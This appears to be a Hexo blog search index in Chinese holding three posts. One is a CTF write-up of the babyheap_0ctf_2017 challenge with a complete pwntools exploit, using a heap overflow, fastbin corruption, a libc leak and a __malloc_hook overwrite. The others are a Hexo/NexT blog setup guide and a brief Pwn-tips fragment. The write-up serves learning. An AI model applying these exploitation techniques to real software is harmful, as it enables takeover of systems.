<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BUUCTF babyheap_0ctf_2017</title>
    <url>/2023/08/14/BUUCTF%20babyheap_0ctf_2017/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
第一道Heap，插个里程碑纪念一下XD
</blockquote>

<span id="more"></span>
<h1 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h1><p>七月学完栈溢出，ak掉buu前两页的所有栈题<br>八月本来是想把堆学穿，等回想起这个目标前半个月已经没了<br>参加了个数据安全的夏令营<br>给sdu的新生赛搞宣传（本来想出点签到题结果已经被人出好了TT^TT）<br>给SecretFlow审了一点go语言的洞<br>然后用C#和xaml给sdu校园网写了个一键修复脚本<br>总而言之学的很杂…说实话真不如多打点比赛。<br>本来栈的能力就没得到比赛的检验，堆的学习时间又所剩无几了…<br>总而言之还是脚踏实地学一点算一点吧<br>还有个南大PA的坑等着我去填呢…才刚把nemu的gdb实现了个单步步入…  </p>
<hr>
<h1 id="0x01-babyheap-0ctf-2017"><a href="#0x01-babyheap-0ctf-2017" class="headerlink" title="0x01 babyheap_0ctf_2017"></a>0x01 babyheap_0ctf_2017</h1><blockquote>
<p>做完这道题才算真正意义上的AK第一页XD</p>
<h3 id="Ⅰ-主要知识点"><a href="#Ⅰ-主要知识点" class="headerlink" title="Ⅰ. 主要知识点"></a>Ⅰ. 主要知识点</h3><ol>
<li>堆溢出</li>
</ol>
</blockquote>
<h3 id="Ⅱ-解题步骤"><a href="#Ⅱ-解题步骤" class="headerlink" title="Ⅱ. 解题步骤"></a>Ⅱ. 解题步骤</h3><ol>
<li><p>checksec 保护全开<br><img src="/pic/Pasted image 20230814133847.png" alt=""></p>
</li>
<li><p>该elf文件在ubuntu16中创建，wsl用的本机libc肯定不合适，所以<code>patchelf</code>一下  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure>
</li>
<li><p>拖进IDA64分析，让反汇编以后的代码好看一点<br><img src="/pic/Pasted image 20230814134313.png" alt=""><br><img src="/pic/Pasted image 20230814134623.png" alt=""><br>注：IDA中快捷键y可以修改变量类型，上图Alloc函数的我将a1的变量类型<code>_int64</code>修改为<code>_int64*</code></p>
</li>
<li><p>IDA分析可知，我们可以有以下思路：</p>
<ol>
<li>Fill函数的输入字符数量是受我们控制的，所以可以堆溢出；</li>
<li>由于本题并没有给出system等可以直接提权的函数，所以考虑泄露libc地址<ol>
<li>要泄露libc地址，肯定要读存有libc地址的地址<ol>
<li>哪里存着libc地址？unsorted bin仅有一个chunk时，此chunk的fd和bk都指向<code>地址main_arena+58</code>，而main_arena是libc的data段中的一个全局静态变量，所以泄露它就可以知道libc_base（注：此处存放的是topchunk的地址）</li>
<li>怎么去读unsorted bin的fd/bk指针？堆溢出+多次free/alloc</li>
</ol>
</li>
</ol>
</li>
<li>有了libc地址，我们可以通过修改fastbin的fd指针，在程序的__malloc_hook处(用libc+偏移来计算)申请一个我们可以操控的堆块，并在其中写入og的地址来提权</li>
</ol>
</li>
<li><p>大概思路我们有了，接下来是写exp+调试验证思路。我们为了能够将chunk放入unsorted bin，肯定需要一个small chunk；要fastbin attack，肯定需要两个fastbin chunk；为了方便控制这三个chunk，我们再设置两个fastbin chunk，即：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x10) #index = 0</span><br><span class="line">alloc(0x10) #index = 1</span><br><span class="line">alloc(0x10) #index = 2</span><br><span class="line">alloc(0x10) #index = 3</span><br><span class="line">alloc(0x80) #index = 4</span><br></pre></td></tr></table></figure>
<p>此时堆的情况如下<br><img src="/pic/Pasted image 20230814140742.png" alt=""></p>
</li>
<li><p>Free掉index为1和2的chunk，给后面alloc留出空间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(1)</span><br><span class="line">free(2)</span><br></pre></td></tr></table></figure>
<p>heap情况如下<br><img src="/pic/Pasted image 20230814141436.png" alt=""><br>bin情况如下<br><img src="/pic/Pasted image 20230814141724.png" alt=""></p>
</li>
<li><p>堆溢出，操控fastbin</p>
<ol>
<li>现在是main_arena_fastbin_0x20 —-&gt; chunk2 —-&gt;chunk1</li>
<li>我们想办法让它变成 xxx_0x20 —-&gt; chunk2 —-&gt;chunk4<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = (p64(0)*3 +p64(0x21))*2 + p8(0x80)</span><br><span class="line">fill(0,payload)</span><br></pre></td></tr></table></figure>
（这里读者可以自己gdb.attach用bin命令去查看fastbin前后的状态）</li>
</ol>
</li>
<li><p>由于从fastbin申请chunk时会检查fastbin中chunk的size，如果不匹配则报错，所以我们要通过堆溢出修改chunk4的size，让其从0x91变为0x21</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br></pre></td></tr></table></figure>
</li>
<li><p>申请两个大小为0x10的chunk，可以看到<code>原chunk1</code>指向了<code>原chunk2的地址</code>，<code>原chunk2</code>指向了<code>原chunk4的地址</code>，这样我们就有两个指针指向chunk4了，可以用一个指针来释放，一个指针来读取，方便阅读我们分别命名为pointer_chunk4和pointer_chunk2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br></pre></td></tr></table></figure>
<p>heap情况如下<br><img src="/pic/Pasted image 20230814143302.png" alt=""></p>
</li>
<li><p>直接用pointer_chunk4释放chunk4，ptmalloc会因为找不到topchunk而报错。所以我们应该恢复chunk4的size到0x91再free，但这样会导致chunk4直接跟topchunk合并。所以我们要先恢复chunk4的size到0x91再申请一个0x80大小的堆块隔离topchunk再free</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">alloc(0x80)</span><br><span class="line">free(4)</span><br></pre></td></tr></table></figure>
</li>
<li><p>此时chunk4的fd和bk就已经存放着一个地址了，我们通过pointer_chunk2来把他读出来<br><img src="/pic/Pasted image 20230814144704.png" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base   ---&gt;   &quot;,hex(libc_base))</span><br></pre></td></tr></table></figure>
</li>
<li><p>我们现在有了libc的地址，下一步是劫持malloc_hook。由于我们要通过fastbin来再malloc_hook处申请堆块，所以我们要通过fastbin对于size的检验，所以看一下malloc_hook前面有没有我们能够申请堆块的地方<br><img src="/pic/Pasted image 20230814145721.png" alt=""><br>发现aed处的0x0000007f符合fastbin的空间，所以我们用libc_base+0x3c4aed(这个用当前地址减去基地址即可算出)来申请</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x60)                                    # 将unsortedbin中的chunk4切0x60大小申请出来</span><br><span class="line">free(4)                                        # 把chunk4放到fastbin中，便于用pointer_chunk2操控</span><br><span class="line">payload = p64(libc_base+0x3c4aed)              # 把申请块写进malloc_hook前面</span><br><span class="line">fill(2,payload)                                # 这一步后，fastbin: main_arena ---&gt; chunk4 ---&gt; _ + 0x3c4aed</span><br><span class="line">alloc(0x60)                                    # 把chunk4申请回来</span><br><span class="line">alloc(0x60)                                    # 在malloc_hook处构造堆，index=6</span><br></pre></td></tr></table></figure>
</li>
<li><p>我们修改chunk6的内容，即修改malloc_hook，我们用og来提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*19 + p64(libc_base + 0x4526a)</span><br><span class="line">fill(6,payload)</span><br></pre></td></tr></table></figure>
</li>
<li><p>若malloc_hook不为空，再申请堆时会先调用malloc_hook处的函数，所以随便申请即可cat flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(255)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Ⅲ-完整EXP"><a href="#Ⅲ-完整EXP" class="headerlink" title="Ⅲ. 完整EXP"></a>Ⅲ. 完整EXP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 25970</span><br><span class="line">file = &#x27;./babyheap_0ctf_2017&#x27;</span><br><span class="line">  </span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"># gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">  </span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(1))</span><br><span class="line">    io.sendlineafter(&#x27;Size: &#x27;, str(size))</span><br><span class="line">  </span><br><span class="line">def fill(index, content):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(2))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;, str(index))</span><br><span class="line">    io.sendlineafter(&#x27;Size: &#x27;, str(len(content)))</span><br><span class="line">    io.sendlineafter(&#x27;Content: &#x27;,content)</span><br><span class="line">  </span><br><span class="line">def free(index):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(3))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;,str(index))</span><br><span class="line">  </span><br><span class="line">def dump(index):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(4))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;, str(index))</span><br><span class="line">    io.recvline()</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x80)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">payload = (p64(0)*3 +p64(0x21))*2 + p8(0x80)</span><br><span class="line">fill(0,payload)</span><br><span class="line">  </span><br><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x80)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">free(4)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base   ---&gt;   &quot;,hex(libc_base))</span><br><span class="line">  </span><br><span class="line">gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">free(4)</span><br><span class="line">  </span><br><span class="line">payload = p64(libc_base+0x3c4aed)</span><br><span class="line">fill(2,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">  </span><br><span class="line">payload = b&#x27;a&#x27;*19 + p64(libc_base + 0x4526a)</span><br><span class="line">fill(6,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(255)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="Ⅳ-一些疑问"><a href="#Ⅳ-一些疑问" class="headerlink" title="Ⅳ. 一些疑问"></a>Ⅳ. 一些疑问</h3><ol>
<li>__malloc_hook不是在data段中吗？这题开了FULL RELRO为什么可以改啊🤔</li>
<li>第九步中heap中chunk2的Addr为什么还是40而不是80啊？</li>
<li>第十步为什么chunk4会跟topchunk合并？是哪个bin的机制？</li>
<li><strong><em>为什么非要在aed处申请堆块？</em></strong></li>
</ol>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>WriteUp, Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo &amp; Next 博客配置与美化</title>
    <url>/2023/01/10/Hexo%20&amp;%20Next%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
鉴于我自己的创作欲，准备正式地经营我的博客XD
</blockquote>

<span id="more"></span>
<h1 id="0x0-说在前面"><a href="#0x0-说在前面" class="headerlink" title="0x0 说在前面:"></a>0x0 说在前面:</h1><blockquote>
<p>环境：Win11<br>参考资料：CodeSheep师傅在b站上的视频 &amp; Next官方文档</p>
<p>在配置的过程中经常忘记自己配了什么，导致这篇博客可能不是很全，后续换电脑重配环境时再补充XD</p>
</blockquote>
<h1 id="0x1-Hexo初始化一个博客"><a href="#0x1-Hexo初始化一个博客" class="headerlink" title="0x1 Hexo初始化一个博客"></a>0x1 Hexo初始化一个博客</h1><p>首先，我们需要在<a href="https://nodejs.org/en/">Node.js官网</a>中下载nodejs</p>
<p>其次，在终端输入<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p>
<blockquote>
<p>👆这一步其实可有可无，只不过换到淘宝镜像源以后cnpm的安装速度更快一些</p>
</blockquote>
<p>输入<code>cnpm -install -g hexo-cli</code>安装hexo框架，这样hexo就安装好啦XD</p>
<hr>
<p>建立一个空文件夹，并在命令行按序输入<code>hexo init</code>,这样本地的博客就搭建好啦XD</p>
<p>打开自己的Github，创建一个新仓库，名字为<code>个人名称.github.io</code></p>
<p>在终端输入<code>cnpm install --save hexo-deployer-git</code>安装部署器</p>
<p>打开<strong><em>站点配置文件</em></strong>，修改Deployment下的配置<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:https://github.com/GithubName/GithubName.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure></p>
<p>继续在空文件夹打开终端，输入<code>hexo g</code>和<code>hexo d</code>博客就能部署到远端啦XD</p>
<blockquote>
<p>这里我之前是配置过账户和密码的，所以没有弹出配置的问题，当时也是稀里糊涂就弄好了，导致现在不太清楚到底发生了什么，就没办法复盘，等后面换新电脑再说吧XD</p>
</blockquote>
<h1 id="0x2-Hexo-config-amp-Theme-config"><a href="#0x2-Hexo-config-amp-Theme-config" class="headerlink" title="0x2 Hexo config &amp; Theme config"></a>0x2 Hexo config &amp; Theme config</h1><p>我使用的这一个主题👇，这里具体讲讲博客的配置<br><a href="http://theme-next.iissnan.com/">NexT 使用文档 (iissnan.com)</a><br>为了描述方便，在以下说明中：<br>将<strong><em>hexo init生成的config文件</em></strong>称为<code>站点配置文件</code><br>将<strong><em>theme的config文件</em></strong>称为<code>主题配置文件</code></p>
<hr>
<ul>
<li>配置主题<br>在hexo站点目录中用终端输入👇<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
打开<strong><em>站点配置文件</em></strong>，修改:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure></li>
<li>个人偏好-<strong><em>主题配置文件</em></strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line">scheme: Muse</span><br><span class="line"># scheme: Mist</span><br><span class="line"># scheme: Pisces</span><br><span class="line"># scheme: Gemini</span><br></pre></td></tr></table></figure></li>
<li>站点图像-<strong><em>主题配置文件</em></strong><br>修改之前记得在themes\\next\source\images文件夹中保存好你要上传的图像，图像尺寸要符合16x16和32x32<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">favicon:</span><br><span class="line">  small: /images/favicon-16x16.png</span><br><span class="line">  medium: /images/favicon-32x32.png</span><br><span class="line">  apple_touch_icon: /images/apple-touch-icon-next.png</span><br><span class="line">  safari_pinned_tab: /images/logo.svg</span><br><span class="line">  #android_manifest: /images/manifest.json</span><br><span class="line">  #ms_browserconfig: /images/browserconfig.xml</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li>社交链接-<strong><em>主题配置文件</em></strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Social Links</span><br><span class="line"># Usage: `Key: permalink || icon`</span><br><span class="line"># Key is the link label showing to end users.</span><br><span class="line"># Value before `||` delimiter is the target permalink, value after `||` delimiter is the name of Font Awesome icon.</span><br><span class="line">social:</span><br><span class="line">  GitHub: https://github.com/HeyGap || fab fa-github</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li>搜索:先在站点目录下安装<code>npm install hexo-generator-searchdb --save</code></li>
</ul>
<p><strong><em>站点配置文件</em></strong><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure><br><strong><em>主题配置文件</em></strong>：添加<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure></p>
<hr>
<ul>
<li>引用示例<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;blockquote class=&quot;blockquote-center&quot;&gt;</span><br><span class="line">靡不有初 鲜克有终</span><br><span class="line">&lt;p&gt;&lt;p&gt;</span><br><span class="line">&lt;br&gt;《诗经》</span><br><span class="line">&lt;/blockquote&gt;</span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">
靡不有初 鲜克有终
<p><p>
<br>《诗经》
</blockquote>

</li>
</ul>
<hr>
<ul>
<li>更大更有吸引力的图片来源于<code>&lt;img src=&quot;/image-url&quot; class=&quot;full-image&quot; /&gt;</code></li>
</ul>
<hr>
<ul>
<li>Bootstrap Callout使用方式</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% note class_name %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>
<p>其中，<code>class_name</code> 可以是以下列表中的一个值：</p>
<div class="note default">
            <p>default </p>
          </div>
<div class="note primary">
            <p>primary </p>
          </div>
<div class="note success">
            <p>success </p>
          </div>
<div class="note info">
            <p>info </p>
          </div>
<div class="note warning">
            <p>warning </p>
          </div>
<div class="note danger">
            <p>danger </p>
          </div>
<hr>
<h1 id="0x3-LaTex配置"><a href="#0x3-LaTex配置" class="headerlink" title="0x3 LaTex配置"></a>0x3 LaTex配置</h1><blockquote>
<p>我这边pandoc总是出错，于是转用了kramed</p>
</blockquote>
<p>终端输入<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnpm uninstall hexo-renderer-marked --save</span><br><span class="line">cnpm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></p>
<p><strong><em>主题配置文件</em></strong></p>
<blockquote>
<p>为了加快渲染速度，per_page我选的true，如果嫌麻烦可以直接false</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">  # Default (true) will load mathjax / katex script on demand.</span><br><span class="line">  # That is it only render those page which has `mathjax: true` in Front-matter.</span><br><span class="line">  # If you set it to false, it will load mathjax / katex srcipt EVERY PAGE.</span><br><span class="line">  per_page: true</span><br><span class="line">  </span><br><span class="line">  # hexo-renderer-pandoc (or hexo-renderer-kramed) required for full MathJax support.</span><br><span class="line">  mathjax:</span><br><span class="line">    enable: true</span><br><span class="line">    # See: https://mhchem.github.io/MathJax-mhchem/</span><br><span class="line">    mhchem: false</span><br></pre></td></tr></table></figure>
<p>记得在需要渲染的md加入<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mathjax: true</span><br></pre></td></tr></table></figure></p>
<p>Test the $X_{n-1}$</p>
<blockquote>
<p>不过渲染后就导致写md时多了几个规矩</p>
<ol>
<li>—-的上下必须各空一格</li>
</ol>
</blockquote>
<h1 id="0x4-Hexo-x-Next-美化"><a href="#0x4-Hexo-x-Next-美化" class="headerlink" title="0x4 Hexo x Next 美化"></a>0x4 Hexo x Next 美化</h1><ul>
<li>动态背景<br>在<strong><em>站点目录</em></strong>打开git，输入<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/theme-next-canvas-nest themes/next/source/lib/canvas-nest</span><br></pre></td></tr></table></figure>
在<strong><em>主题配置文件</em></strong>中加入<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">canvas_nest: # 网络背景</span><br><span class="line">  enable: true</span><br><span class="line">  onmobile: true # display on mobile or not</span><br><span class="line">  color: &#x27;0,0,0&#x27; # RGB values, use &#x27;,&#x27; to separate</span><br><span class="line">  opacity: 0.5 # the opacity of line: 0~1</span><br><span class="line">  zIndex: -1 # z-index property of the background</span><br><span class="line">  count: 150 # the number of lines</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>记得把其他的动态背景关闭呀，比如</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">three:</span><br><span class="line">  enable: false</span><br><span class="line">  three_waves: false</span><br><span class="line">  canvas_lines: true</span><br><span class="line">  canvas_sphere: false</span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: false</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>文章结尾<br>在路径 <code>\themes\next\layout\_macro</code> 中新建 <code>passage-end-tag.swig</code> 文件,并添加以下内容：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------文章就到这里啦！&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读XD-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
接着打开<code>\themes\next\layout\_macro\post.swig</code>文件，在<code>post-body</code> 之后(<code>END POST BODY</code>)， <code>post-footer</code> 之前添加以下代码:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt; </span><br><span class="line">	&#123;% if not is_index %&#125; </span><br><span class="line">		&#123;% include &#x27;passage-end-tag.swig&#x27; %&#125; </span><br><span class="line">	&#123;% endif %&#125; </span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
然后打开<strong><em>主题配置文件</em></strong>，在末尾添加：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passage_end_tag: </span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li>贴一个<a href="https://fontawesome.dashgame.com/">图标库Font Awesome)</a>，<strong><em>主题配置文件</em></strong>里的在线图标基本都要用到它</li>
</ul>
<hr>
<ul>
<li>代码块复制<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_theme: night</span><br><span class="line">codeblock:</span><br><span class="line">  border_radius:</span><br><span class="line">  copy_button:</span><br><span class="line">    enable: true</span><br><span class="line">    show_result: true</span><br><span class="line">    # Available values: default | flat | mac</span><br><span class="line">    style: mac</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li>回到顶部与阅读进度<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">back2top:</span><br><span class="line">  enable: true</span><br><span class="line">  # Back to top in sidebar.</span><br><span class="line">  sidebar: false</span><br><span class="line">  # Scroll percent label in b2t button.</span><br><span class="line">  scrollpercent: true</span><br><span class="line">  </span><br><span class="line"># Reading progress bar</span><br><span class="line">reading_progress:</span><br><span class="line">  enable: true</span><br><span class="line">  # Available values: top | bottom</span><br><span class="line">  position: top</span><br><span class="line">  color: &quot;#7B68EE&quot;</span><br><span class="line">  height: 3px</span><br></pre></td></tr></table></figure>
附一些参考资料XD~</li>
</ul>
<p><a href="https://baike.baidu.com/item/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81#:~:text=%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81%E5%B0%B1%E6%98%AF%E5%9C%A8%E8%BD%AF%E4%BB%B6%E4%B8%AD%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82%E5%9C%A8%E5%BE%88%E5%A4%9A%E8%BD%AF%E4%BB%B6%E4%B8%AD%EF%BC%8C%E9%83%BD%E4%BC%9A%E9%81%87%E5%88%B0%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E5%8F%91%E5%B1%95%E6%9D%A5%E6%BA%90%20%E4%BA%BA%E7%9A%84%E7%9C%BC%E7%9D%9B%E7%9C%8B%E5%88%B0%E7%9A%84%E9%A2%9C%E8%89%B2%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%9A,%E4%B8%80%E7%A7%8D%E6%98%AF%E5%8F%91%E5%85%89%E4%BD%93%E5%8F%91%E5%87%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%8C%E6%AF%94%E5%A6%82%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%BE%E7%A4%BA%E5%99%A8%E5%B1%8F%E5%B9%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%9B%20%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%98%AF%E7%89%A9%E4%BD%93%E6%9C%AC%E8%BA%AB%E4%B8%8D%E5%8F%91%E5%85%89%EF%BC%8C%E8%80%8C%E6%98%AF%E5%8F%8D%E5%B0%84%E7%9A%84%E5%85%89%E4%BA%A7%E7%94%9F%20%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E3%80%82">十六进制颜色码_百度百科 (baidu.com)</a></p>
<hr>
<ul>
<li>增加阅读次数/时长和访客数-<strong><em>主题配置文件</em></strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">  enable: true  #是否开启不蒜子统计功能</span><br><span class="line">  total_visitors: true #是否统计总访客数</span><br><span class="line">  total_visitors_icon: user #访客数图标为人像</span><br><span class="line">  total_views: true #是否同级总访问数</span><br><span class="line">  total_views_icon: eye #访问数图标为眼睛</span><br><span class="line">  post_views: true #是否统计文章访问数</span><br><span class="line">  post_views_icon: eye #访问数图标为眼睛</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<ul>
<li>链接样式<br>修改文件 <code>themes\next\source\css\_common\components\post\post.styl</code>，在末尾添加如下css样式：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.post-body p a&#123;</span><br><span class="line">  color: #0593d3;</span><br><span class="line">  border-bottom: none;</span><br><span class="line">  border-bottom: 1px solid #0593d3;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    color: #6A5ACD;</span><br><span class="line">    border-bottom: none;</span><br><span class="line">    border-bottom: 1px solid #fc6423;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<p>参考文章👇</p>
<p><a href="https://www.mickeymiao.top/posts/f9b8ceb/">hexo NexT主题美化总结 | MickeyMiao</a></p>
<p>深度美化-放着吃灰</p>
<p><a href="https://blog.csdn.net/maosidiaoxian/article/details/85220394">如何在Hexo中对文章md文件分类_貌似掉线的博客-CSDN博客</a><br><a href="https://zhuanlan.zhihu.com/p/64965187">使用 Hexo Hey 管理你的博客 - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>Environment</category>
      </categories>
      <tags>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>Some tricks in Pwn</title>
    <url>/2023/08/04/Some%20tricks%20in%20Pwn/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
脑力有限，本文旨在存储Pwn题中的雷区与奇技淫巧
</blockquote>

<span id="more"></span>
<hr>
<h1 id="0x01-雷区"><a href="#0x01-雷区" class="headerlink" title="0x01  雷区"></a>0x01  雷区</h1><h3 id="1-Some-bugs-in-IDA"><a href="#1-Some-bugs-in-IDA" class="headerlink" title="1.  Some bugs in IDA"></a>1.  Some bugs in IDA</h3><ol>
<li>当点进StackView发现对应区域没有变量名时，动调看偏移。<ol>
<li>原因：IDA会分析错误</li>
<li>例题：buuctf - cmcc_simplerop</li>
</ol>
</li>
<li>IDA显示的函数变量有可能与pwndbg显示的有区别</li>
</ol>
